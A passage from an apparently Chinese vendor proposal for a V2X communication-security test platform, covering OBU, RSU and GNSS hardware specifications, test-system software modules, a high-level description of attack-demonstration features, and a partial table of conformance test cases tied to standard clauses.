环境多样性：外场测试可以在不同的地理位置和交通状况下进行，以涵盖多样的驾驶场景。测试车辆可以在城市道路、高速公路、乡村道路等不同环境中进行测试，以验证系统在各种条件下的表现。</p><p>- 现场故障模拟：在外场测试中，可以模拟各种故障情况，如传感器故障、通信中断、道路障碍物等，以测试系统的容错和应对能力。</p><p>（3）GNSS辅助工具参数</p><p>Antenna Center Frequency：</p><ul><li>BeiDou: 1561MHz±2.046MHz</li><li>GPS:1575.42 MHz±1.023MHz</li><li>GLONASS:1602 MHz±2.046MHz</li><li>Peak Gain：2dBi</li><li>VSWR：1.9</li><li>Polarization：RHCP</li><li>Impedance：50 Ω</li></ul><p>LNA Frequency：</p><ul><li>BeiDou: 1561MHz±2.046MHz</li><li>GPS:1575.42 MHz±1.023MHz</li><li>GLONASS:1602 MHz±2.046MHz</li><li>Impedance：50 Ω Nominal</li><li>VSWR：1.5.</li><li>Gain：28±2 dB</li><li>DC Power Input：3~5.5V</li><li>Noise Figure：1.5 dB Typ.</li><li>Power Consumption：40 mA</li><li>Signal Output：Dual output</li><li>Isolation：&gt;20dB</li><li>Temperature：-40℃~85℃</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/eb73facc9e68060abad9361e94ca8009.png"></p><p>（4）OBU设备参数</p><ul><li>天线：包含2路LTE-V与1路GNSS天线，其中2路LTE-V天线可以做TX/RX Antenna Diversity；GNSS天线更新频率10Hz，GNSS支持制式：GPS、GLONASS、BeiDou、Galileo。</li><li>运行内存：1GB DDR，存储空间8GB EMMC，且支持Micro TF card扩展。</li><li>CAN通讯：支持2路高速CAN 2.0B，最大波特率1Mbps。</li><li>以太网接口：包含一路千兆RJ45接口。</li><li>4G模块:支持2G/3G/4G通信、通话、一台网口、OTA、传输性能支持CAT4、MMO 2X1。</li><li>2.4G Wi-Fi：支持IEEE 802.11 b\g\n协议。</li><li>外壳防护等级：IP40。</li><li>LTE-V模组：持AP(Application Processor)+BP(Baseband Processor)架构，所有V2X相关协议栈与网络安全模块运行在AP，AP与BP通过内部桥接的模式连接。</li><li>通信性能：最大有效通信距离等于150m，在有效距离内丢包率10%，延时100ms；通过不同长度的报文时，通信抖动幅度稳定。</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/60aafbf8df31fea29f0b49bf884f24a8.png"></p><p>（5）RSU设备参数</p><ul><li>额定工作电压：12V</li><li>额定工作电压范围：9-36V</li><li>工作温度：-40℃~ +70℃</li><li>存储温度：-40℃~ +90℃</li><li>工作电流：<a href="mailto:&#x32;&#x41;&#64;&#49;&#x32;&#46;&#x35;&#86;">&#x32;&#x41;&#64;&#49;&#x32;&#46;&#x35;&#86;</a></li><li>最大电流：<a href="mailto:&#x34;&#x41;&#x40;&#x31;&#50;&#x2e;&#x35;&#86;">&#x34;&#x41;&#x40;&#x31;&#50;&#x2e;&#x35;&#86;</a></li><li>Memory：EMMC 8GB、DDR 1GB、支持Micro TF card 扩展</li><li>1路千兆RJ45接口</li><li>GNSS：更新频率：10Hz ; 2.5m(open sky)</li><li>GNSS支持制式：GPS、GLONASS、BeiDou、Galileo</li><li>2G/3G/4G通讯：Network TypeBand</li><li>LTE_FDD（with Rx-diversity）：B1/B3/B5/B8</li><li>LTE-TDD（with Rx-diversity）：B34/B38/B39/B40/B41</li><li>WCDMA（with Rx-diversity）：B1/B8</li><li>TD-SCDMA：B34/B39</li><li>EVDO/CDMA：BC0</li><li>GSM：900/1800MHz</li><li>Dead Reckoning：Optional</li><li>外壳防护等级：：IP40</li><li>输入输出：支持1路LED输出功能</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/e48e3913d7d5a3556fe3f4d34cbb4c88.png"></p><h3 id="测试模拟系统"><a href="#测试模拟系统" class="headerlink" title="测试模拟系统"></a>测试模拟系统</h3><h4 id="系统体系结构"><a href="#系统体系结构" class="headerlink" title="系统体系结构"></a>系统体系结构</h4><h5 id="测试系统基础模块"><a href="#测试系统基础模块" class="headerlink" title="测试系统基础模块"></a>测试系统基础模块</h5><p>该模块能实现端到端V2X无线通信系统测试平台基于跨平台C++ 图形用户界面应用程序开发框架平台搭建，提供如下基础功能模块：工程向导、核心编辑器、底层资源库等。</p><h5 id="工程向导-1"><a href="#工程向导-1" class="headerlink" title="工程向导"></a>工程向导</h5><p>该模块实现工程向导负责新建工程，并且用于组织和管理Q资源。当通过工程向导创建新的工程项目时，系统自动解压资源模板包，并且生成工程项目目录。</p><p>在软件开发和测试环境中，工程向导模块扮演着至关重要的角色，尤其是在项目初始化和资源管理方面。这个模块的设计意图是简化和自动化新工程项目的创建过程，同时提供一套标准化和易于管理的资源和项目结构。</p><p>新建工程：工程向导的首要功能是引导用户通过创建新工程项目的过程。这通常涉及收集用户输入的关键信息，如项目名称、类型、目标平台、编程语言等。工程向导可能还会询问用户是否需要特定的配置或依赖库，以及其他任何项目初始化时需要考虑的选项。</p><p>组织和管理Q资源：所谓的Q资源可能是指那些特定于公司或项目的库、框架、模板或其他工具。工程向导会有一个资源库，其中存放了这些Q资源的集合。这些资源可以是预先定义好的代码文件、文档模板、配置文件、脚本等，它们用于加速开发进程并保持项目的一致性。</p><p>自动解压资源模板包：一旦用户完成了新建工程的配置，工程向导会自动执行资源模板包的解压操作。资源模板包是一组预先定义好的文件和目录，它们构成了工程项目的基础框架。这个自动化步骤省去了用户手动设置项目结构的麻烦，同时减少了因配置错误而可能导致的问题。</p><p>生成工程项目目录：资源模板包解压后，工程向导将生成工程项目的目录结构。这个结构通常包括源代码目录、资源目录、第三方库目录、构建系统配置目录等。一个良好的目录结构是项目成功的关键，因为它影响到版本控制、代码维护和团队协作。</p><p>通过这样的设计，工程向导模块不仅提高了项目创建的效率，还确保了每个新项目都能够遵循组织内部的最佳实践和标准。这对于维护大型项目和确保项目质量是非常重要的，它允许开发者专注于实现业务逻辑，而不是消耗时间在设置和配置项目上。</p><p>V2X测试模拟设备</p><p>该模块实现硬件平台提供以太网硬件接口、CAN总线接口、GNSS模块、调试工具模块已经底层V2X通信芯片模块。基于硬件平台之上，该设备部署相符性测试工具的各个软件模块，包括消息转发模块、数据处理模块、底层V2X通信协议栈及相应的辅助模块。</p><p>消息转发模块</p><p>该模块实现消息转发模块支持通过TCP/IP有线和软件测试系统之间通信。</p><p>V2X测试模拟设备的消息转发模块和软件测试系统之间通过TCP/IP有线通信，和软件测试系统之间符合TCI标准，当软件测试系统发送消息时，将消息内容以TCP/IP报文的payload形式发送给该模块。该模块将符合TCI标准的消息解析，解析出要发送的消息透传给数据处理模块；同时，当V2X测试模拟设备接收到V2X报文时，需要将V2X转换给符合TCI标准的TCP/IP报文发送给软件测试系统。</p><p>数据处理模块</p><p>该模块提供基于底层协议栈的发送及接收功能。</p><p>协议栈模块</p><p>该模块实现符合V2X标准的协议栈，用于和待测设备之间进行V2X无线通信协议栈包括网络层、消息层及信息安全。</p><p>辅助模块</p><p>该模块实现GNSS数据处理功能、CAN数据处理功能、日志系统及测试调试功能，支持处理GPS数据、CAN总线数据、运行时产生日志及运行时问题跟踪定位功能。</p><h6 id="核心编译器"><a href="#核心编译器" class="headerlink" title="核心编译器"></a>核心编译器</h6><p>该模块实现核心编辑器完全支持相关开发平台标准规范，它不仅提供了标准的文本编辑功能，例如打开/保存、复制/粘贴、查找/替换等，还提供了一些对用户友好的附加功能，包括可配置的语法高亮显示、代码折叠、内容助手、文本格式化、内容大纲、代码模板和语义检查器等。</p><p>核心编辑器是软件开发环境中的关键组件，它提供了一系列标准和高级的文本编辑功能，旨在提高开发人员的工作效率和代码质量。基础功能包括打开和保存文件，这是编辑器的基本要求，允许用户加载现有代码或文本文件到编辑器中进行修改，并保存更改。复制和粘贴功能使得用户可以轻松地在文档中或跨文档复制文本，而查找和替换功能则提供了一个快速定位和修改特定字符串的有效手段。</p><p>除了这些标准功能之外，核心编辑器还提供了一系列用户友好的附加功能，以进一步提升用户体验。可配置的语法高亮显示是其中一个特色功能，它根据不同的编程语言语法规则，以不同的颜色和样式突出显示代码，使得阅读和理解代码更加简单直观。代码折叠功能允许用户隐藏或显示代码块，这在处理大型文件时特别有用，因为它可以帮助用户专注于当前正在编辑的代码段。</p><p>内容助手是一种智能提示工具，它在编写代码时提供自动完成、参数信息和成员列表，极大地提高了编码速度和准确性。文本格式化功能自动调整代码的缩进和对齐，保持代码的整洁和一致性。内容大纲提供了文档结构的鸟瞰图，让用户能够快速导航到代码的不同部分。</p><p>代码模板是预定义的代码片段，用户可以通过简单的触发词来插入常用的代码结构，从而节省时间并减少重复性工作。最后，语义检查器则是一个强大的工具，它超越了简单的语法高亮显示，能够理解代码的语义，检查潜在的逻辑错误、未定义的变量和类型不匹配等问题，帮助开发者在代码编写阶段就预防错误。</p><h6 id="底层资源库-1"><a href="#底层资源库-1" class="headerlink" title="底层资源库"></a>底层资源库</h6><p>该模块实现底层资源库包含独立于实际测试套件的可以提前编译成二进制的手工编写的C++代码组成的公共和静态库部分。</p><p>底层资源库是软件测试框架中的核心组件，它提供了一系列预先编写好的、可复用的代码库，这些代码库是用C++编写的，并且可以独立于具体的测试套件存在。这些资源库的主要目的是为了提供一个稳定和高效的基础，以支持上层的测试套件运行。</p><p>由于这些库是用C++编写的，它们可以在使用前编译成二进制形式，这意味着它们在测试执行时的性能非常高，因为已经是编译好的机器代码。这种预编译的方法可以显著减少测试执行时的延迟，因为避免了在测试时进行即时编译的需要。</p><h6 id="测试组件设计-amp-执行模块-1"><a href="#测试组件设计-amp-执行模块-1" class="headerlink" title="测试组件设计&amp;执行模块"></a>测试组件设计&amp;执行模块</h6><p>该模块实现测试组件设计&amp;执行模块为测试系统提供控制中心和UI展现功能。实现个设备运行、系统自检以及可执行测试用例的运行，并且通过TCI命令接口对IUT实现自动化测试及控制。</p><p>底层资源库是软件测试框架中的核心组件，它提供了一系列预先编写好的、可复用的代码库，这些代码库是用C++编写的，并且可以独立于具体的测试套件存在。这些资源库的主要目的是为了提供一个稳定和高效的基础，以支持上层的测试套件运行。</p><p>由于这些库是用C++编写的，它们可以在使用前编译成二进制形式，这意味着它们在测试执行时的性能非常高，因为已经是编译好的机器代码。这种预编译的方法可以显著减少测试执行时的延迟，因为避免了在测试时进行即时编译的需要。</p><h5 id="V2X测试模拟设备"><a href="#V2X测试模拟设备" class="headerlink" title="V2X测试模拟设备"></a>V2X测试模拟设备</h5><p>该模块实现硬件平台提供以太网硬件接口、CAN总线接口、GNSS模块、调试工具模块已经底层V2X通信芯片模块。基于硬件平台之上，该设备部署相符性测试工具的各个软件模块，包括消息转发模块、数据处理模块、底层V2X通信协议栈及相应的辅助模块。</p><p>该模块描述了一个综合性的测试设备，它集成了多种硬件接口和软件组件，用于执行车辆通信系统（如V2X，即Vehicle-to-Everything）的相符性测试。这类测试是为了确保车辆通信系统的实现与相关的标准和规范相一致。以下是模块的关键组成部分及其功能的详细说明：</p><p>硬件平台接口：</p><p>1.以太网硬件接口：提供标准的网络通信能力，允许测试设备通过以太网与其他系统或测试设备进行数据交换。</p><p>2.CAN总线接口：用于连接车辆内部网络，实现与车辆控制单元（ECUs）的通信，这对于集成测试和车辆系统的诊断至关重要。</p><p>3.GNSS模块：全球导航卫星系统（GNSS）模块提供精确的时间和地理位置信息，这是V2X通信中位置相关服务的关键组成部分。</p><p>4.调试工具模块：用于监测、调试和分析硬件平台的运行状态，帮助开发人员定位问题和优化系统性能。</p><p>5.底层V2X通信芯片模块：这是实现车辆与车辆、车辆与基础设施通信的核心硬件组件，支持V2X通信的各种标准和协议。</p><p>软件模块：</p><p>1.消息转发模块：负责在测试设备内部以及设备与外部系统之间转发V2X消息，确保消息能够正确地从源点传输到目标点。</p><p>2.数据处理模块：对接收和发送的数据进行处理，包括数据验证、编码、解码和必要的转换，以符合V2X通信的要求。</p><p>3.底层V2X通信协议栈：实现V2X通信所需的各种协议，包括物理层、数据链路层、网络层和应用层协议。这个协议栈是确保与其他V2X设备互操作性的基础。</p><p>4.辅助模块：包括日志记录、配置管理、安全机制等支持功能，它们帮助维护系统的正常运行，提供必要的测试信息，并确保通信的安全性。</p><p>基于这些硬件和软件组件，相符性测试工具能够执行一系列的测试案例，以验证V2X系统的实现是否遵循了相应的标准和规范。这些测试覆盖了从物理层到应用层的各个方面，确保了系统的全面性和准确性。通过这些测试，可以确保V2X系统在实际部署前的性能和可靠性，从而提高道路安全和提升交通效率。</p><h4 id="消息转发模块"><a href="#消息转发模块" class="headerlink" title="消息转发模块"></a>消息转发模块</h4><p>该模块实现消息转发模块支持通过TCP/IP有线和软件测试系统之间通信。</p><p>V2X测试模拟设备的消息转发模块和软件测试系统之间通过TCP/IP有线通信，和软件测试系统之间符合TCI标准，当软件测试系统发送消息时，将消息内容以TCP/IP报文的payload形式发送给该模块。该模块将符合TCI标准的消息解析，解析出要发送的消息透传给数据处理模块；同时，当V2X测试模拟设备接收到V2X报文时，需要将V2X转换给符合TCI标准的TCP/IP报文发送给软件测试系统。</p><p>为了实现这一要求，消息转发模块需要具备以下关键功能：</p><p>1. TCP/IP通信能力：模块必须能够通过TCP/IP协议进行有线通信，这意味着它需要能够建立和维护TCP连接，发送和接收TCP数据包。</p><p>2. TCI标准的支持：TCI（Testing and Test Control Notation）是一种用于测试系统和设备之间通信的标准。消息转发模块需要能够理解和构造符合TCI标准的消息。</p><p>3. 消息解析和构造：模块需要能够解析从软件测试系统接收到的TCP/IP报文中的payload，将其转换为V2X测试模拟设备可以理解的格式，同时也需要能够将V2X设备的消息转换为符合TCI标准的TCP/IP报文发送回软件测试系统。</p><p>基于这些功能，消息转发模块的工作流程大致如下：</p><p>接收软件测试系统消息：</p><p>- 模块监听指定的TCP端口，等待软件测试系统的连接。</p><p>- 当软件测试系统建立连接并发送TCP/IP报文时，模块接收报文并提取payload。</p><p>- 模块解析payload中的TCI消息，根据TCI标准将消息内容转换为V2X模拟设备可以处理的格式。</p><p>- 转换后的消息被发送到数据处理模块，进一步处理后发送到V2X模拟设备。</p><p>发送消息到软件测试系统：</p><p>- 当V2X测试模拟设备产生要发送的消息时，数据处理模块将消息处理成符合V2X标准的格式。</p><p>- 消息转发模块将这些V2X消息转换为符合TCI标准的TCP/IP报文。</p><p>- 转换后的报文通过建立的TCP连接发送给软件测试系统。</p><p>为了实现这个功能，可能需要以下技术组件：</p><p>- TCP/IP协议栈：用于实现网络通信的基础软件组件。</p><p>- TCI解析器/构造器：用于解析和构造符合TCI标准的消息。</p><p>- 数据处理逻辑：将接收到的消息进行必要的处理，以便它们可以被正确地发送到目标设备，或将接收到的设备消息转换为适合发送的格式。</p><p>- 接口定义：明确定义消息格式、通信协议和接口规范，以确保消息的正确解析和构造。</p><p>开发此类消息转发模块时，需要密切遵循TCI标准文档，并确保模块的实现与软件测试系统兼容。此外，还需要进行充分的测试，以确保在各种情况下都能正确地处理消息。</p><h4 id="数据处理模块"><a href="#数据处理模块" class="headerlink" title="数据处理模块"></a>数据处理模块</h4><p>该模块提供基于底层协议栈的发送及接收功能。</p><h4 id="协议栈模块"><a href="#协议栈模块" class="headerlink" title="协议栈模块"></a>协议栈模块</h4><p>该模块实现符合V2X标准的协议栈，用于和待测设备之间进行V2X无线通信协议栈包括网络层、消息层及信息安全。</p><p>为确保与待测设备的无线通信符合V2X标准，需开发一套协议栈。该协议栈涵盖网络层，负责数据传输；消息层，处理消息的封装与解析；以及信息安全层，确保通信的加密与认证。这三层的协同工作保障了V2X通信的标准化执行与数据的安全性。</p><h4 id="辅助模块"><a href="#辅助模块" class="headerlink" title="辅助模块"></a>辅助模块</h4><p>该模块实现GNSS数据处理功能、CAN数据处理功能、日志系统及测试调试功能，支持处理GPS数据、CAN总线数据、运行时产生日志及运行时问题跟踪定位功能。</p><p>该模块集成了多项关键功能，以支持V2X通信系统的测试和验证：</p><p>1. GNSS数据处理：模块能够接收和处理全球导航卫星系统（GNSS）的信号，主要用于GPS数据的获取和解析，确保位置信息的精确性。</p><p>2. CAN数据处理：模块具备处理控制器局域网络（CAN）总线数据的能力，这对于车载系统的诊断和监控至关重要。</p><p>3. 日志系统：模块具有记录操作和事件的日志系统，能够捕获运行时的数据和状态，为后续分析提供依据。</p><p>4. 测试调试功能：模块支持运行时问题的跟踪和定位，这对于测试人员来说是一个重要的功能，它可以帮助快速地识别和修复发现的问题。</p><p>这些功能的整合，使得该模块成为一个强大的工具，用于V2X通信系统的测试和验证，确保系统的可靠性和符合性。</p><h3 id="测试系统管理模块"><a href="#测试系统管理模块" class="headerlink" title="测试系统管理模块"></a>测试系统管理模块</h3><p>该模块实现对试验管理软件的基本操作，如打开关闭试验，下载模型等。包含测试系统的TCI流程处理，系统参数配置与测试系统其它模块的交互接口。</p><p>为了支持试验管理软件的基本操作，模块需要具备以下关键功能：</p><p>1. 试验控制：模块应能够通过用户界面或自动化脚本启动和停止试验。这包括处理试验的初始化和清理流程。</p><p>2. 模型管理：模块需要提供下载和加载测试模型的功能。这通常涉及到与文件系统或网络资源的交云，以及对模型文件的解析和验证。</p><p>3. TCI流程处理：模块应实现Testing and Test Control Notation（TCI）标准，以确保与测试系统的其它部分进行标准化的通信和控制流程。</p><p>4. 系统参数配置：模块应允许用户或其他系统模块配置和修改系统参数，包括硬件设置、网络配置、测试参数等。</p><p>5. 交互接口：模块需要定义和实现与测试系统其它模块交互的接口，涉及API调用、消息队列或其他形式的进程间通信。</p><p>综合这些功能，模块能够提供一个完整的试验管理解决方案，支持从试验的准备、执行到结束的全过程，同时提供必要的配置和扩展性以适应不同的测试需求。</p><h3 id="测试系统执行模块"><a href="#测试系统执行模块" class="headerlink" title="测试系统执行模块"></a>测试系统执行模块</h3><p>该模块实现测试系统的数据结构转换适配器，抽象测试套件，测试运行态控制器，支持测试执行计划的配置功能，支持根据测试需求定制每次测试执行的范围和每条测试程序执行的顺序、次数等，相关配置计划可以保存。</p><p>该模块作为测试系统的核心组成部分，需要包含以下关键组件和功能：</p><p>1. 数据结构转换适配器：负责在不同的数据格式和系统表示之间转换数据，确保测试数据能够在各个组件和系统之间无缝流动。</p><p>2. 抽象测试套件：提供一套通用的测试接口和模板，允许测试人员根据不同的测试需求快速配置和部署测试套件。</p><p>3. 测试运行态控制器：控制测试的执行流程，包括启动测试、监控测试状态、处理测试结果和停止测试。</p><p>4. 测试执行计划配置：允许用户或测试人员配置测试计划，包括选择要执行的测试案例、定义执行顺序、设置执行次数等。</p><p>5. 定制测试执行范围：支持根据特定的测试需求定制每次测试的执行范围，以便进行针对性的测试。</p><p>6. 保存配置计划：提供功能以保存相关的测试配置和执行计划，使其可用于未来的测试重复使用或作为模板。</p><p>通过这些组件和功能，该模块能够提供灵活的测试执行环境，支持高度定制的测试场景，并且通过保存配置计划，增强了测试的可重复性和效率。</p><h3 id="测试系统报告生成模块"><a href="#测试系统报告生成模块" class="headerlink" title="测试系统报告生成模块"></a>测试系统报告生成模块</h3><p>该模块实现根据测试内容生成测试报告，支持测试报告下载导出。</p><h3 id="V2X安全演示功能"><a href="#V2X安全演示功能" class="headerlink" title="V2X安全演示功能"></a>V2X安全演示功能</h3><p>该模块实现窃听演示、篡改攻击演示、伪造车辆攻击演示、伪造RSU攻击演示、防护演示。</p><p>该模块设计为一个综合性的安全测试平台，具有以下关键功能：</p><p>1. 窃听演示：模拟攻击者监听V2X通信，展示如何捕获和分析传输中的数据，用于教育用户关于通信隐私的重要性和窃听的风险。</p><p>2. 篡改攻击演示：演示攻击者如何在通信过程中修改消息的内容，包括对数据包的内容进行篡改，以及这种攻击可能对系统造成的影响。</p><p>3. 伪造车辆攻击演示：模拟一个攻击者创建虚假的车辆信息，比如位置、速度等，来误导其他车辆或基础设施，展示这种攻击的检测和防御机制。</p><p>4. 伪造RSU攻击演示：模拟攻击者伪造道路侧单元（Road-Side Units, RSU）的消息，展示这种攻击如何影响车辆行为以及如何通过安全机制来防范。</p><p>5. 防护演示：展示在V2X通信中实施的安全防护措施，如加密、认证、完整性校验等，以及这些措施如何有效防止上述攻击。</p><p>该模块不仅能够用于演示潜在的安全威胁，还能够展示如何部署有效的安全措施来提高V2X系统的安全性。通过这些演示，它可以作为一个教育和测试工具，帮助开发者和研究者理解并改进V2X通信系统的安全性。</p><h3 id="测试用例和软件实现——V2X安全验证测试用例及对应软件实现（含源码）"><a href="#测试用例和软件实现——V2X安全验证测试用例及对应软件实现（含源码）" class="headerlink" title="测试用例和软件实现——V2X安全验证测试用例及对应软件实现（含源码）"></a>测试用例和软件实现——V2X安全验证测试用例及对应软件实现（含源码）</h3><p>我司为本项目提供的测试软件可完全覆盖测试用例需求，并为甲方提供源代码。</p><h4 id="安全标准符合性测试用例和脚本"><a href="#安全标准符合性测试用例和脚本" class="headerlink" title="安全标准符合性测试用例和脚本"></a>安全标准符合性测试用例和脚本</h4><p>根据v2x安全验证的内容和场景，我司将提供测试用例，覆盖相关需求，测试用例个数需60个，同时根据客户需求，可定制增加。</p><p>测试用例检测内容涵盖汽标委《基于LTE-V2X直连通信的车载信息交互系统技术要求及试验方法》中关于通信安全相关技术指标，涵盖CCSA《基于LTE的车联网通信安全技术要求》、CCSA《基于LTE的车联网无线通信技术 安全证书管理系统技术要求》两项标准中全部技术指标、汽标委《汽车整车信息安全技术要求》中V2X通信测试指标。</p><h4 id="实验室测试用例库"><a href="#实验室测试用例库" class="headerlink" title="实验室测试用例库"></a>实验室测试用例库</h4><p>我司为本项目的测试用例涵盖了OBU及RSU的协议格式检查及协议变异检查的测试用例。覆盖如下内容：</p><table><thead><tr><th><strong>序号</strong></th><th><strong>测试分类</strong></th><th><strong>测试用例名称</strong></th><th><strong>标准相关技术指标</strong></th></tr></thead><tbody><tr><td>1</td><td>DUT接收测试</td><td>包含可选参数的SPDU信息解析测试</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 4.2V2X 通信安全服务架构 — 4.2.1 安全功能和安全实体— 可选参数SPDU信息错误</td></tr><tr><td>2</td><td>DUT接收测试</td><td>安全证书签名的SPDU信息解析测试</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 4.2V2X 通信安全服务架构 — 4.2.1 安全功能和安全实体— 可选参数SPDU信息错误</td></tr><tr><td>3</td><td>DUT接收测试</td><td>跨CA证书签名消息测试</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 4.2V2X 通信安全服务架构 — 4.2.1 安全功能和安全实体— 跨CA可以验证不通过</td></tr><tr><td>4</td><td>DUT签发测试</td><td>安全消息版本号信息测试</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 6.4 安全协议数据单元（SPDU） — 6.4.1 V2XSecData— 安全版本号填充错误</td></tr><tr><td>5</td><td>DUT签发测试</td><td>安全消息签名信息测试</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 6.1LTE-V2X 证书管理系统架构 — 6.4.1安全协议数据单元（SPDU） — 安全消息签名信息</td></tr><tr><td>6</td><td>DUT签发测试</td><td>待签数据内容测试</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 6.4安全协议数据单元（SPDU） — 6.4.6 SignedDataPayload — 待签数据内容</td></tr><tr><td>7</td><td>DUT签发测试</td><td>待签数据头信息测试</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 6.4安全协议数据单元（SPDU） — 6.4.5 ToBeSignedData — 待签数据头信息</td></tr><tr><td>8</td><td>DUT签发测试</td><td>待签数据杂凑算法信息测试</td><td>11-10修改版基于LTE-V2X直连通信的车载信息交互性系统技术要求-9.2neu修订201205 — 6.46.4 通信安全要求 — 6.4.2.2 密码杂凑算法（hashId） — 待签数据杂凑算法</td></tr><tr><td>9</td><td>DUT签发测试</td><td>待签数据版本号测试</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 6.1LTE-V2X 证书管理系统架构 — 6.1.9 应用消息签名和验签过程中一致性检查要求 — 签发证书版本号</td></tr><tr><td>10</td><td>DUT签发测试</td><td>数字证书cracaId信息测试</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 6.2LTE-V2X 安全证书 — 6.2.1 证书基本结构 — 数字证书信息</td></tr><tr><td>11</td><td>DUT签发测试</td><td>数字证书公钥信息测试</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 6.5数字证书和证书管理数据格式 — 6.5.36 VerificationKeyIndicator — 数字证书公钥信息</td></tr><tr><td>12</td><td>DUT签发测试</td><td>数字证书有效性限定信息测试</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 6.1LTE-V2X 证书管理系统架构 — 6.1.9 应用消息签名和验签过程中一致性检查要求 — 证书有效性限定</td></tr><tr><td>13</td><td>DUT签发测试</td><td>数字证书版本号信息测试</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 6.4 安全协议数据单元（SPDU） — 6.4.1 V2XSecData— 待签数据版本号</td></tr><tr><td>14</td><td>DUT签发测试</td><td>数字证书签发者信息测试</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 6.5数字证书和证书管理数据格式 — 6.5.36 VerificationKeyIndicator — 数字证书签发者信息</td></tr><tr><td>15</td><td>DUT签发测试</td><td>数字证书签名信息测试</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 6.1LTE-V2X 证书管理系统架构 — 6.1.9 应用消息签名和验签过程中一致性检查要求 — 数字证书签名信息</td></tr><tr><td>16</td><td>DUT签发测试</td><td>数字证书类型信息测试</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 6.1LTE-V2X 证书管理系统架构 — 6.1.8 证书类型 — 数字证书签发者信息</td></tr><tr><td>17</td><td>DUT签发测试</td><td>签名者证书摘要信息测试</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 6.5数字证书和证书管理数据格式 — 6.5.6IssuerIdentifier— 签名者证书摘要信息</td></tr><tr><td>18</td><td>DUT签发测试</td><td>证书持有者信息测试</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 6.5数字证书和证书管理数据格式 — 6.5.8 CertificateId — 证书持有者信息测试</td></tr><tr><td>19</td><td>DUT签发测试</td><td>证书未生效测试</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 6.1LTE-V2X 证书管理系统架构 — 6.1.9 应用消息签名和验签过程中一致性检查要求— 签发证书未生效</td></tr><tr><td>20</td><td>DUT签发测试</td><td>证书过期测试</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 6.1LTE-V2X 证书管理系统架构 — 6.1.9 应用消息签名和验签过程中一致性检查要求 — 签发证书过期</td></tr><tr><td>21</td><td>安全消息验证测试</td><td>安全消息版本号非法测试</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 6.1LTE-V2X 证书管理系统架构 — 6.4.1安全协议数据单元（SPDU） — 安全消息版本号非法</td></tr><tr><td>22</td><td>安全消息验证测试</td><td>安全消息签名信息非法测试</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 4.2V2X 通信安全服务架构 — 4.2.2 通信安全协议数据单元 — 安全消息签名信息非法测试</td></tr><tr><td>23</td><td>安全消息验证测试</td><td>安全消息签名者类型非法测试</td><td>11-10修改版基于LTE-V2X直连通信的车载信息交互性系统技术要求-9.2neu修订201205 — 6.4 通信安全要求 — 6.4.2.5签名者 — 安全消息签名者类型非法测试</td></tr><tr><td>24</td><td>安全消息验证测试</td><td>安全消息证书地理区域非法测试</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 6.1LTE-V2X 证书管理系统架构 — 6.1.9 应用消息签名和验签过程中一致性检查要求— 安全消息证书地理区域</td></tr><tr><td>25</td><td>安全消息验证测试</td><td>安全消息证书应用权限非法测试</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 6.1LTE-V2X 证书管理系统架构 — 6.1.9 应用消息签名和验签过程中一致性检查要求— 安全消息证书应用权限非法</td></tr><tr><td>26</td><td>安全消息验证测试</td><td>安全消息证书摘要非法测试</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 6.5数字证书和证书管理数据格式 — 6.5.6IssuerIdentifier— 安全消息证书摘要非法</td></tr><tr><td>27</td><td>安全消息验证测试</td><td>安全消息证书签发权限非法测试</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 6.1LTE-V2X 证书管理系统架构 — 6.1.9 证书一致性检查要求— 签发权限非法</td></tr><tr><td>28</td><td>安全消息验证测试</td><td>安全消息证书签名非法测试</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 6.1LTE-V2X 证书管理系统架构 — 6.1.9 应用消息签名和验签过程中一致性检查要求— 安全消息证书签名非法测试</td></tr><tr><td>29</td><td>安全消息验证测试</td><td>安全消息证书链非法测试</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 8.2PKI 互信架构 — 安全消息证书链非法</td></tr><tr><td>30</td><td>安全消息验证测试</td><td>待签数据产生时间过早测试</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 